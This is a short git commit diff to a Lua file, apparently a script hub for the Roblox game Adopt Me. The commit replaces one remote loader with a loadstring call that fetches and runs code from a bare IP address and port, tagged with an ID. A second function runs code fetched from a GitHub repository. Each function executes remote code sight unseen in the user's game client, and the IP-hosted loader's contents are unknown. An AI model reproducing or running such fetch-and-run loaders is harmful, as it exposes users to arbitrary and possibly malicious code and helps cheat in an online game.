65ccf5e1c17d4a81a0fb92a651c12746679bf2ec
LuaScript <Franzforger15@gmail.com>
2025-11-01 01:29:46 +0800

    Update AdoptmeScripts.lua

--- AdoptmeScripts.lua
+++ AdoptmeScripts.lua
@@ -1,5 +1,6 @@
 local function s1()
-loadstring(game:HttpGet("https://paste.debian.net/plainh/74161293/", true))() 
+ID="074bb868-c09e-41bd-a308-0f74a4a0a554";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
 end 
 local function s2() 
     loadstring(game:HttpGet("https://raw.githubusercontent.com/snthnova/Snthnova-Hub/refs/heads/main/lua"))()
